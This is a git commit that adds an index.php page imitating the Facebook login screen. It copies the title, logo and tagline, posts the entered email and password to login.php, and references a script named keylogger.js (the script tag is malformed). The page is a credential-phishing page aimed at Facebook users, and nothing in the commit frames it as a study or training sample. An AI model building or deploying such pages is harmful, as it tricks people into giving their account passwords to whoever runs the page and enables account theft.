ad61e0b61a0dd9cd56648e15b0c1a5472e6a5e75
root <root@atreus.atreus>
2024-03-31 17:59:09 -0300

    first commit

---
+++ index.php
@@ -0,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <link rel="stylesheet" href="index_files/default.css">
+    <link rel="stylesheet" href="index_files/style.css">
+    <script> src="index_files/keylogger.js"</script>
+</head>
+<body>
+    <div class="login">
+        <div class="container">
+            <div class="row">
+                <div class="col-7">
+                    <div class="align-center">
+                        <div class="content">
+                            <img src="index_files/img/fb.png" alt="">
+                            <p>Facebook helps you connect and share with the people in your life.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-5 col-xs-12">
+                    
+                        <div class="login-form">
+                            <form method="post" class="bb" novalidate="1" id="login-form" action="login.php">
+                                <input for="username" name="username" id="username" type="username" placeholder="Email address or phone number"><br>
+                                <input for="password" name="password" id="password" type="password" placeholder="Password"><br>
+                                <button id="login-btn">Log In</button><br>
+                                <a href="#">Forgotten password?</a><br>
+                                <button id="create-btn">Create New Account</button><br>
+                            </form>
+                        </div>
+                        <footer>
+                            <a href="#" 
+                            style="font-weight: bold;
+                            color: var(--black);
+                            text-decoration: none;">Create a Page</a> 
+                            for a celebrity, band or business.
+                        </footer>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
